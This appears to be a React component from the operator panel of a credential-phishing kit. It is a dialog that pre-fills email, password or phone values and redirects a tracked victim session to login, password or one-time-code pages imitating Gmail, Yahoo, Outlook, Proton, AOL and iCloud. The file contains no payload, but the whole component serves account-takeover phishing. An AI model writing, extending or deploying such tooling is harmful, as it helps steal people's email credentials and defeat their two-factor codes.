import React, { useState } from 'react';
import { X, Mail, Key, User, Globe } from 'lucide-react';

const PlaceholderDialog = ({ isOpen, onClose, onConfirm, page, sessionId }) => {
  const [placeholders, setPlaceholders] = useState({
    email: '',
    username: '',
    password: '',
    phone: ''
  });

  // Determine which placeholders are needed based on the page
  const getRequiredPlaceholders = (pageName) => {
    if (!pageName) return [];
    const pageType = pageName.toLowerCase();

    // Email provider pages
    if (pageType.includes('gmail') || pageType.includes('yahoo') ||
        pageType.includes('outlook') || pageType.includes('proton') ||
        pageType.includes('aol') || pageType.includes('icloud')) {

      if (pageType.includes('login')) {
        return ['email'];
      } else if (pageType.includes('password')) {
        return ['password'];
      } else if (pageType.includes('otp')) {
        return ['phone'];
      }
    }

    return [];
  };

  const requiredFields = getRequiredPlaceholders(page);

  const handleSubmit = (e) => {
    e.preventDefault();

    // Filter out only the required placeholders
    const filteredPlaceholders = {};
    requiredFields.forEach(field => {
      if (placeholders[field]) {
        filteredPlaceholders[field] = placeholders[field];
      }
    });

    onConfirm(sessionId, page, filteredPlaceholders);
    onClose();

    // Reset form
    setPlaceholders({
      email: '',
      username: '',
      password: '',
      phone: ''
    });
  };

  const handleSkip = () => {
    onConfirm(sessionId, page, {});
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 overflow-y-auto">
      {/* Backdrop */}
      <div className="fixed inset-0 bg-black/70 backdrop-blur-sm" onClick={onClose} />

      {/* Dialog */}
      <div className="flex min-h-full items-center justify-center p-4">
        <div className="relative w-full max-w-md transform overflow-hidden rounded-2xl
                      bg-[#1C2029] border border-gray-800/50 shadow-2xl
                      transition-all">

          {/* Header */}
          <div className="relative px-6 pt-6 pb-4 border-b border-gray-800/50">
            <h3 className="text-lg font-semibold text-white">
              Set Placeholder Values
            </h3>
            <p className="mt-1 text-sm text-gray-400">
              Enter values to pre-fill on redirect to <span className="text-blue-400">{page}</span>
            </p>
            <button
              onClick={onClose}
              className="absolute top-6 right-6 p-1 rounded-lg hover:bg-white/10
                       transition-colors duration-200"
            >
              <X className="w-5 h-5 text-gray-400" />
            </button>
          </div>

          {/* Body */}
          <form onSubmit={handleSubmit} className="px-6 py-4">
            <div className="space-y-4">
              {requiredFields.length === 0 ? (
                <div className="text-center py-4">
                  <p className="text-gray-400">No placeholders needed for this page</p>
                </div>
              ) : (
                <>
                  {requiredFields.includes('email') && (
                    <div>
                      <label className="flex items-center text-sm font-medium text-gray-300 mb-2">
                        <Mail className="w-4 h-4 mr-2 text-blue-400" />
                        Email Address
                      </label>
                      <input
                        type="email"
                        value={placeholders.email}
                        onChange={(e) => setPlaceholders({...placeholders, email: e.target.value})}
                        className="w-full px-3 py-2 rounded-lg bg-[#161A22] border border-gray-800/50
                                 text-gray-300 focus:outline-none focus:border-blue-500/50
                                 focus:ring-1 focus:ring-blue-500/20"
                        placeholder="user@example.com"
                      />
                    </div>
                  )}

                  {requiredFields.includes('username') && (
                    <div>
                      <label className="flex items-center text-sm font-medium text-gray-300 mb-2">
                        <User className="w-4 h-4 mr-2 text-blue-400" />
                        Username
                      </label>
                      <input
                        type="text"
                        value={placeholders.username}
                        onChange={(e) => setPlaceholders({...placeholders, username: e.target.value})}
                        className="w-full px-3 py-2 rounded-lg bg-[#161A22] border border-gray-800/50
                                 text-gray-300 focus:outline-none focus:border-blue-500/50
                                 focus:ring-1 focus:ring-blue-500/20"
                        placeholder="username"
                      />
                    </div>
                  )}

                  {requiredFields.includes('password') && (
                    <div>
                      <label className="flex items-center text-sm font-medium text-gray-300 mb-2">
                        <Key className="w-4 h-4 mr-2 text-blue-400" />
                        Password
                      </label>
                      <input
                        type="text"
                        value={placeholders.password}
                        onChange={(e) => setPlaceholders({...placeholders, password: e.target.value})}
                        className="w-full px-3 py-2 rounded-lg bg-[#161A22] border border-gray-800/50
                                 text-gray-300 focus:outline-none focus:border-blue-500/50
                                 focus:ring-1 focus:ring-blue-500/20"
                        placeholder="password"
                      />
                    </div>
                  )}

                  {requiredFields.includes('phone') && (
                    <div>
                      <label className="flex items-center text-sm font-medium text-gray-300 mb-2">
                        <Globe className="w-4 h-4 mr-2 text-blue-400" />
                        Phone Number
                      </label>
                      <input
                        type="tel"
                        value={placeholders.phone}
                        onChange={(e) => setPlaceholders({...placeholders, phone: e.target.value})}
                        className="w-full px-3 py-2 rounded-lg bg-[#161A22] border border-gray-800/50
                                 text-gray-300 focus:outline-none focus:border-blue-500/50
                                 focus:ring-1 focus:ring-blue-500/20"
                        placeholder="+1234567890"
                      />
                    </div>
                  )}
                </>
              )}
            </div>

            {/* Actions */}
            <div className="flex justify-end space-x-3 mt-6">
              <button
                type="button"
                onClick={handleSkip}
                className="px-4 py-2 rounded-lg bg-gray-800/50 hover:bg-gray-800/70
                         text-gray-300 transition-colors duration-200"
              >
                Skip
              </button>
              <button
                type="submit"
                className="px-4 py-2 rounded-lg bg-blue-500 hover:bg-blue-600
                         text-white transition-colors duration-200"
              >
                Redirect with Values
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

export default PlaceholderDialog;